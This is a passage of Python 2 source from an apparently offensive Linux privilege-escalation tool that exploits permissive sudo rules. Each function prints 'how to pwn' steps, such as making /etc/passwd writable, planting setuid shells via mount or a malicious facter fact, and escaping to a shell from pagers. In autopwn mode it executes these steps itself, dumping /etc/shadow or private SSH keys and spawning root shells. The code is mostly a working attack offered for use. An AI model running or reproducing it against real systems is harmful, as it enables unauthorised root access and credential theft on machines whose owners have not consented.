    print OKBLUE + "[2] Now change the ownership of /etc/passwd so you can edit it (I am doing 777 because why not): " + ENDC
    print OKRED + " [*] sudo chmod 777 /etc/passwd" + ENDC
    print OKBLUE + "[3] Now that /etc/passwd is world writable we can change our UID to 0: " + ENDC
    print OKRED + " [*] vim /etc/passwd (Change your UID to 0)" + ENDC
    print OKBLUE + "[4] Next logout and log back in. You will notice your UID is now 0 and have root level access." + ENDC
    print OKBLUE + "[5] Finally lets do the right thing and change the permissions back to 644 on /etc/passwd: " + ENDC
    print OKRED + " [*] sudo chmod 644 /etc/passwd" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO cat Rule Pwnage
def cat(cat_user):

    if args.info:
        print OKYELLOW + "\n---------------------------------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule we will use sudo cat to print out a root owned file (this can be any file owned by root you want but we are using /etc/shadow): " + ENDC
        if (cat_user == "ALL") or (cat_user == "root"):
            print OKRED + " [*] sudo cat /etc/shadow" + ENDC
        else:
            print OKRED + " [*] sudo -u " + cat_user + " cat <filename>" + ENDC
        print OKYELLOW + "\n---------------------------------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the cat rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the cat rule now!!!" + ENDC
            
            if (cat_user == "ALL") or (cat_user == "root"):
                print OKGREEN + "[!] Running cat command to get /etc/shadow contents!" + ENDC
                call("sudo cat /etc/shadow", shell=True)
            else:
                filename = raw_input("\n" + OKBLUE + "[?] Enter file path/name of file you wish to cat as user " + cat_user + "(e.g. /home/<user>/.ssh/id_rsa): " + ENDC)
                print OKGREEN + "[!] Running cat command as " + cat_user + " to get " + filename + "!" + ENDC
                call("sudo -u " + cat_user + " cat " + filename, shell=True)

        if question == False:
            sudopwner()


# SUDO mount Rule Pwnage
def mount():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First take a USB drive of your choosing and format it to be ext3 filesystem (Linux command below): " + ENDC
    print OKRED + " [*] mkfs -t ext3 <drive>" + ENDC
    print OKBLUE + "[2] Now mount it on your attacking computer and place a setuid shell as root within it: " + ENDC
    print OKRED + " [*] mount -t ext3 -o 'rw' <drive> <mount point>" + ENDC
    print OKRED + " [*] cp /bin/ksh <mount point>/pwn ; chmod 4777 <mount point>/pwn" + ENDC
    print OKBLUE + "[3] Now take your USB drive and mount it on the victim machine as an ext3 filesystem: " + ENDC
    print OKRED + " [*] sudo mount -t ext3 -o 'rw' <drive> <mount point>" + ENDC
    print OKBLUE + "[4] Execute the setuid shell within your drive and profit!" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO facter Rule Pwnage
def facter(facter_user):

    if args.info:
        print OKYELLOW + "\n----------------------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
        print OKBLUE + "[1] First create a malicious script locally that will be executed by facter: " + ENDC
        print OKRED + " [*] echo 'Facter.add(:pwn) do setcode do pwn = Facter::Util::Resolution.exec('cp /bin/ksh /tmp/pwnage; chmod 4777 /tmp/pwnage') end end'" + ENDC
        print OKBLUE + "[2] Now execute sudo facter with your new and improved fact script: " + ENDC
        if (facter_user == "ALL") or (facter_user == "root"):
            print OKRED + " [*] sudo facter --custom-dir=. pwn" + ENDC
        else:
            print OKRED + " [*] sudo -u " + facter_user + " facter --custom-dir=. pwn" + ENDC
        print OKBLUE + "[3] Now execute your setuid shell that is waiting for you in /tmp/." + ENDC
        print OKYELLOW + "\n----------------------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user(OKRED + "\n[?] Do you wish to abuse the facter rule? " + ENDC)

        if question == True:

            print OKGREEN + "\n[!] Pwning the facter rule now!!!" + ENDC
            print OKGREEN + "\n[!] Creating malicious fact!" + ENDC
            call('''echo "Facter.add(:pwn) do setcode do pwn = Facter::Util::Resolution.exec('cp /bin/ksh /tmp/pwnage; chmod 4777 /tmp/pwnage') end end" > pwn.rb''', shell=True)

            sleep(0.5)

            if (facter_user == "ALL") or (facter_user == "root"):
                print OKGREEN + "\n[!] Executing facter to execute our awesome fact to get setuid shell as root!" + ENDC
                call("sudo facter --custom-dir=. pwn",shell=True)
            else:
                print OKGREEN + "\n[!] Executing facter to execute our awesome fact to get setuid shell as " + facter_user + "!" + ENDC
                call("sudo -u " + facter_user + " facter --custom-dir=. pwn", shell=True)

            sleep(0.5)

            print OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC

        if question == False:
            sudopwner()


# SUDO apt-get Rule Pwnage
def aptget():

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC
    print OKBLUE + "[1] First we need to execute apt-get changelog <program> in order to get into pager: " + ENDC
    print OKRED + " [*] sudo apt-get changelog bash" + ENDC
    print OKBLUE + "[2] Now type !/bin/bash and enjoy your shell!" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()


# SUDO sh Rule Pwnage
def sh(sh_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (sh_user == "ALL") or (sh_user == "root"):
            print OKRED + "[*] sudo /bin/sh" + ENDC
        else:
            print OKRED + "[*] sudo -u " + sh_user + " /bin/sh" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the sh rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the sh rule now!!!" + ENDC

            if (sh_user == "ALL") or (sh_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo /bin/sh", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + sh_user + "!" + ENDC
                call("sudo -u " + sh_user + " /bin/sh", shell=True)

        if question == False:
            sudopwner()

# SUDO ksh Rule Pwnage
def ksh(ksh_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (ksh_user == "ALL") or (ksh_user == "root"):
            print OKRED + "[*] sudo /bin/ksh" + ENDC
        else:
            print OKRED + "[*] sudo -u " + ksh_user + " /bin/ksh" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the ksh rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the ksh rule now!!!" + ENDC

            if (ksh_user == "ALL") or (ksh_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo /bin/ksh", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + ksh_user + "!" + ENDC
                call("sudo -u " + ksh_user + " /bin/ksh", shell=True)

        if question == False:
            sudopwner()


# SUDO zsh Rule Pwnage
def zsh(zsh_user):

    if args.info:
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
        print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
        print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
        if (zsh_user == "ALL") or (zsh_user == "root"):
            print OKRED + "[*] sudo /bin/sh" + ENDC
        else:
            print OKRED + "[*] sudo -u " + zsh_user + " /bin/sh" + ENDC
        print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
        sys.exit()

    elif args.autopwn:

        question = ask_user( OKRED + "\n[?] Do you wish to abuse the sh rule? " + ENDC)

        if question == True:

            print OKGREEN + "[!] Pwning the sh rule now!!!" + ENDC

            if (zsh_user == "ALL") or (zsh_user == "root"):
                print OKGREEN + "\n[!] Obtaining shell as root!" + ENDC
                call("sudo /bin/zsh", shell=True)
            else:
                print OKGREEN + "\n[!] Obtaining shell as " + zsh_user + "!" + ENDC
                call("sudo -u " + zsh_user + " /bin/zsh", shell=True)

        if question == False:
            sudopwner()


# SUDO nano Rule Pwnage
def nano(nano_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to open a file using the 'nano' command: " + ENDC
    if (nano_user == "ALL") or (nano_user == "root"):
        print OKRED + " [*] sudo nano <filename>" + ENDC
    else:
        print OKRED + " [*] sudo -u " + nano_user + " nano <filename>" + ENDC
    print OKBLUE + "[2] Once the file is open enter either 'F5' or '^R' which will allow you to load a new file into nano." + ENDC
    print OKRED + " [*] Now enter a file you wish to load into nano!" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()

def journalctl(journalctl_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to view logs by running the 'journalctl' command: " + ENDC
    if (journalctl_user == "ALL") or (journalctl_user == "root"):
        print OKRED + " [*] sudo journalctl" + ENDC
    else:
        print OKRED + " [*] sudo -u " + journalctl_user + " journalctl" + ENDC
    print OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()

def dmesg(dmesg_user):

    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
    print OKBLUE + "[1] The first step is to view logs by running the 'dmesg --human' command: " + ENDC
    if (dmesg_user == "ALL") or (dmesg_user == "root"):
        print OKRED + " [*] sudo dmesg --human" + ENDC
    else:
        print OKRED + " [*] sudo -u " + dmesg_user + " dmesg --human" + ENDC
    print OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC
    print OKRED + " [*] !/bin/bash" + ENDC
    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()

def nice(nice_user):

    print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
    print OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC
    print OKBLUE + "[+] To pwn this rule type the following command: " + ENDC
    if (nice_user == "ALL") or (nice_user == "root"):
        print OKRED + "[*] sudo /bin/nice -n 1 /bin/bash" + ENDC
    else:
        print OKRED + "[*] sudo -u " + nice_user + " /bin/nice -n 1 /bin/bash" + ENDC
    print OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
    sys.exit()
	
if __name__ == "__main__":
    main()
